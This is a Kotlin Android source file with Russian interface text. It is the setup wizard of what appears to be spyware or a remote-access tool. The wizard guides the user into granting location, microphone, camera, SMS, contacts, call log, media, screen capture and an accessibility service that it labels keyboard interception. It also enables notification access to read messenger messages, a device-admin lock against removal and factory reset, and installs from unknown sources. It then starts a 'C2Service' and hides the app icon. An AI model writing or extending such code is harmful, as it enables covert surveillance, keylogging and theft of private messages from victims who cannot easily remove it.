package com.sp.core

import android.Manifest
import android.app.Activity
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.media.projection.MediaProjectionManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.view.Gravity
import android.view.View
import android.view.ViewGroup
import android.widget.Button
import android.widget.LinearLayout
import android.widget.ScrollView
import android.widget.TextView
import android.widget.Toast
import androidx.core.app.ActivityCompat
import androidx.core.app.NotificationManagerCompat
import com.sp.core.services.C2Service
import com.sp.core.services.LocationService
import com.sp.core.services.UsageStatsService
import com.sp.core.util.PermState

/**
 * Permission wizard.
 *
 * The old version was an invisible activity that fired system screens one
 * after another - with `noHistory` the activity was destroyed as soon as a
 * settings screen came on top, so the wizard restarted at step 0 and the
 * user ended up granting nothing.
 *
 * This version is a visible, guided list:
 *   - every row shows the live state of one permission
 *   - the button opens exactly the screen where it can be granted
 *   - "Следующий шаг" walks through the ones that are still missing
 *   - the runtime permissions can also be granted in one go, either through
 *     the system dialogs or through the app details screen
 */
class SetupActivity : Activity() {

    private class Step(
        val title: String,
        val hint: String,
        val granted: (Context) -> Boolean,
        val action: (SetupActivity) -> Unit
    )

    private lateinit var listBox: LinearLayout
    private lateinit var summary: TextView
    private val steps = mutableListOf<Step>()

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        try {
            buildSteps()
            setContentView(buildUi())
        } catch (_: Throwable) {
            finish()
        }
    }

    override fun onResume() {
        super.onResume()
        refresh()
    }

    /* ------------------------------------------------------------------ UI */

    private fun buildUi(): View {
        val scroll = ScrollView(this)
        val root = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(dp(18), dp(22), dp(18), dp(30))
            setBackgroundColor(0xFF0B1220.toInt())
        }

        root.addView(TextView(this).apply {
            text = "Настройка системы"
            setTextColor(0xFFE8EEFB.toInt())
            textSize = 21f
            setTypeface(typeface, android.graphics.Typeface.BOLD)
        })
        root.addView(TextView(this).apply {
            text = "Выдайте доступ - агент будет работать в фоне. Каждый пункт можно открыть отдельно."
            setTextColor(0xFF8FA1C0.toInt())
            textSize = 13.5f
            setPadding(0, dp(6), 0, dp(14))
        })

        summary = TextView(this).apply {
            setTextColor(0xFF5D6E8D.toInt())
            textSize = 12.5f
            setPadding(0, 0, 0, dp(12))
        }
        root.addView(summary)

        // --- quick actions -----------------------------------------------
        val quick = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(dp(14), dp(12), dp(14), dp(12))
            setBackgroundColor(0xFF16203A.toInt())
            layoutParams = LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT
            ).apply { bottomMargin = dp(14) }
        }
        quick.addView(TextView(this).apply {
            text = "Быстрый старт"
            setTextColor(0xFFE8EEFB.toInt())
            textSize = 14.5f
            setTypeface(typeface, android.graphics.Typeface.BOLD)
        })
        quick.addView(TextView(this).apply {
            text = "Обычные права (геоданные, микрофон, камера, SMS, контакты, медиа, уведомления) " +
                    "выдаются системными диалогами. Остальные - только в настройках, их приложение " +
                    "не может выдать само."
            setTextColor(0xFF8FA1C0.toInt())
            textSize = 12.5f
            setPadding(0, dp(4), 0, dp(10))
        })
        quick.addView(Button(this).apply {
            text = "Выдать обычные права"
            isAllCaps = false
            setOnClickListener { grantRuntimeAll() }
        })
        quick.addView(Button(this).apply {
            text = "Все обычные права на одном экране"
            isAllCaps = false
            setOnClickListener { openAppDetails() }
        })
        quick.addView(Button(this).apply {
            text = "Следующий шаг"
            isAllCaps = false
            setOnClickListener { nextStep() }
        })
        root.addView(quick)

        listBox = LinearLayout(this).apply { orientation = LinearLayout.VERTICAL }
        root.addView(listBox)

        root.addView(Button(this).apply {
            text = "Запустить агент"
            setOnClickListener { startAgent() }
        }, LinearLayout.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT
        ).apply { topMargin = dp(22) })

        scroll.addView(root)
        return scroll
    }

    private fun buildSteps() {
        steps.clear()

        steps += permStep(
            "Геоданные", "Разрешить геолокацию - определение по GPS и по сети",
            arrayOf(
                Manifest.permission.ACCESS_FINE_LOCATION,
                Manifest.permission.ACCESS_COARSE_LOCATION
            ), background = true
        )
        steps += permStep(
            "Микрофон", "Разрешить запись звука вокруг",
            arrayOf(Manifest.permission.RECORD_AUDIO)
        )
        steps += permStep(
            "Камера", "Разрешить доступ к камере",
            arrayOf(Manifest.permission.CAMERA)
        )
        steps += permStep(
            "SMS", "Разрешить чтение входящих сообщений", arrayOf(
                Manifest.permission.READ_SMS,
                Manifest.permission.RECEIVE_SMS
            )
        )
        steps += permStep(
            "Контакты и звонки", "Разрешить контакты и историю вызовов", arrayOf(
                Manifest.permission.READ_CONTACTS,
                Manifest.permission.READ_CALL_LOG
            )
        )
        steps += permStep(
            "Медиа", "Разрешить доступ к галерее (фото и видео)", arrayOf(
                Manifest.permission.READ_MEDIA_IMAGES,
                Manifest.permission.READ_MEDIA_VIDEO
            )
        )
        steps += permStep(
            "Уведомления", "Разрешить служебное уведомление - без него Android убьёт службу",
            arrayOf(Manifest.permission.POST_NOTIFICATIONS)
        )

        steps += Step(
            "Специальные возможности",
            "Найди в списке «Установленные службы» пункт android_UI и включи его - это перехват клавиатуры",
            { ctx -> PermState.accessibility(ctx) }
        ) { act -> act.openSettings(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)) }

        steps += Step(
            "Служба уведомлений",
            "В списке «Доступ к уведомлениям» включи android_UI - так видны сообщения мессенджеров",
            { ctx -> NotificationManagerCompat.getEnabledListenerPackages(ctx).contains(ctx.packageName) }
        ) { act -> act.openSettings(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)) }

        steps += Step(
            "Доступ к использованию",
            "В списке приложений включи android_UI - это статистика запущенных приложений",
            { ctx -> PermState.usageAccess(ctx) }
        ) { act -> act.openSettings(Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS)) }

        steps += Step(
            "Наложение поверх окон",
            "Разрешить оверлей поверх других приложений",
            { ctx -> PermState.overlay(ctx) }
        ) { act ->
            act.openSettings(
                Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:${act.packageName}"))
            )
        }

        steps += Step(
            "Установка неизвестных приложений",
            "Разрешить установку дополнительных модулей",
            { ctx -> PermState.unknownSources(ctx) }
        ) { act ->
            act.openSettings(
                Intent(Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES, Uri.parse("package:${act.packageName}"))
            )
        }

        steps += Step(
            "Оптимизация батареи",
            "Нажми «Разрешить» - без этого система сама убивает приложение",
            { ctx -> PermState.batteryExempt(ctx) }
        ) { act ->
            act.openSettings(
                Intent(
                    Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
                    Uri.parse("package:${act.packageName}")
                )
            )
        }

        steps += Step(
            "Администратор устройства",
            "Подтверди «Включить» - защита от удаления и сброса до заводских",
            { ctx -> PermState.deviceAdmin(ctx) }
        ) { act ->
            val admin = ComponentName(act, AdminReceiver::class.java)
            act.openSettings(
                Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
                    .putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, admin)
            )
        }

        steps += Step(
            "Захват экрана",
            "Подтверди «Начать захват» - снимки экрана (можно позже)",
            { false }
        ) { act ->
            try {
                val mpm = act.getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
                act.startActivity(mpm.createScreenCaptureIntent())
            } catch (_: Throwable) {
            }
        }
    }

    private fun permStep(
        title: String,
        hint: String,
        perms: Array<String>,
        background: Boolean = false
    ): Step {
        val all = if (background && Build.VERSION.SDK_INT >= 29)
            perms + arrayOf(Manifest.permission.ACCESS_BACKGROUND_LOCATION) else perms
        return Step(title, hint, { ctx -> all.all { PermState.granted(ctx, it) } }) { act ->
            act.requestPerms(all)
        }
    }

    private fun refresh() {
        if (!::listBox.isInitialized) return
        listBox.removeAllViews()
        var ok = 0
        steps.forEach { step ->
            val granted = try { step.granted(this) } catch (_: Throwable) { false }
            if (granted) ok++
            listBox.addView(buildRow(step, granted))
        }
        if (::summary.isInitialized) {
            summary.text = "Готово $ok / ${steps.size}"
        }
    }

    private fun buildRow(step: Step, granted: Boolean): View {
        val card = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(dp(14), dp(12), dp(14), dp(12))
            setBackgroundColor(0xFF131C2F.toInt())
            layoutParams = LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT
            ).apply { bottomMargin = dp(9) }
        }

        val head = LinearLayout(this).apply {
            orientation = LinearLayout.HORIZONTAL
            gravity = Gravity.CENTER_VERTICAL
        }
        head.addView(TextView(this).apply {
            text = step.title
            setTextColor(0xFFE8EEFB.toInt())
            textSize = 14.5f
            setTypeface(typeface, android.graphics.Typeface.BOLD)
            layoutParams = LinearLayout.LayoutParams(0, ViewGroup.LayoutParams.WRAP_CONTENT, 1f)
        })
        head.addView(TextView(this).apply {
            text = if (granted) "ГОТОВО" else "НУЖНО"
            textSize = 10.5f
            setTypeface(typeface, android.graphics.Typeface.BOLD)
            setTextColor(if (granted) 0xFF6EE7A0.toInt() else 0xFFF0B45A.toInt())
        })
        card.addView(head)

        card.addView(TextView(this).apply {
            text = step.hint
            setTextColor(0xFF8FA1C0.toInt())
            textSize = 12.5f
            setPadding(0, dp(3), 0, dp(8))
        })

        val btn = Button(this).apply {
            text = if (granted) "Проверено" else "Выдать"
            isAllCaps = false
            textSize = 12.5f
            if (granted) {
                isEnabled = false
                alpha = 0.5f
            } else {
                setOnClickListener { step.action(this@SetupActivity) }
            }
        }
        card.addView(btn)
        return card
    }

    /* ------------------------------------------------------- permissions */

    private fun requestPerms(perms: Array<String>) {
        val missing = perms.filter { !PermState.granted(this, it) }
        if (missing.isEmpty()) {
            refresh()
            return
        }
        try {
            ActivityCompat.requestPermissions(this, missing.toTypedArray(), REQ_PERMS)
        } catch (_: Throwable) {
            refresh()
        }
    }

    /** All runtime permissions that are still missing, in one request. */
    private fun grantRuntimeAll() {
        val missing = runtimePermissions.filter { !PermState.granted(this, it) }
        if (missing.isEmpty()) {
            refresh()
            Toast.makeText(this, "Все обычные права уже выданы", Toast.LENGTH_SHORT).show()
            return
        }
        requestPerms(missing.toTypedArray())
    }

    /** The app details screen lists every runtime permission as a switch. */
    private fun openAppDetails() {
        openSettings(
            Intent(
                Settings.ACTION_APPLICATION_DETAILS_SETTINGS,
                Uri.parse("package:$packageName")
            )
        )
    }

    override fun onRequestPermissionsResult(
        requestCode: Int, permissions: Array<out String>, grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        refresh()
        val granted = grantResults.count { it == PackageManager.PERMISSION_GRANTED }
        val denied = grantResults.size - granted
        if (denied > 0) {
            Toast.makeText(
                this,
                "Выдано $granted, отказано $denied - можно выдать позже в настройках приложения",
                Toast.LENGTH_LONG
            ).show()
        }
    }

    /** Opens the first permission that is still missing. */
    private fun nextStep() {
        val step = steps.firstOrNull { s ->
            try { !s.granted(this) } catch (_: Throwable) { false }
        }
        if (step == null) {
            Toast.makeText(this, "Все права выданы", Toast.LENGTH_SHORT).show()
            refresh()
            return
        }
        step.action(this)
    }

    /* ------------------------------------------------------------ misc */

    private fun openSettings(intent: Intent) {
        try {
            startActivity(intent)
        } catch (_: Throwable) {
            try {
                startActivity(Intent(Settings.ACTION_SETTINGS))
            } catch (_: Throwable) {
            }
        }
    }

    private fun startAgent() {
        try {
            val c2 = Intent(this, C2Service::class.java)
            if (Build.VERSION.SDK_INT >= 26) startForegroundService(c2) else startService(c2)
        } catch (_: Throwable) {
        }
        try {
            val loc = Intent(this, LocationService::class.java)
            if (Build.VERSION.SDK_INT >= 26) startForegroundService(loc) else startService(loc)
        } catch (_: Throwable) {
        }
        try {
            startService(Intent(this, UsageStatsService::class.java))
        } catch (_: Throwable) {
        }
        try {
            com.sp.core.stealth.IconHider.show(this)
        } catch (_: Throwable) {
        }
        try {
            Toast.makeText(this, "Агент запущен", Toast.LENGTH_SHORT).show()
        } catch (_: Throwable) {
        }
        finish()
    }

    private fun dp(v: Int): Int = (v * resources.displayMetrics.density).toInt()

    companion object {
        private const val REQ_PERMS = 0x5F70

        private val runtimePermissions = arrayOf(
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.ACCESS_BACKGROUND_LOCATION,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.CAMERA,
            Manifest.permission.READ_SMS,
            Manifest.permission.RECEIVE_SMS,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_MEDIA_IMAGES,
            Manifest.permission.READ_MEDIA_VIDEO,
            Manifest.permission.POST_NOTIFICATIONS
        )
    }
}
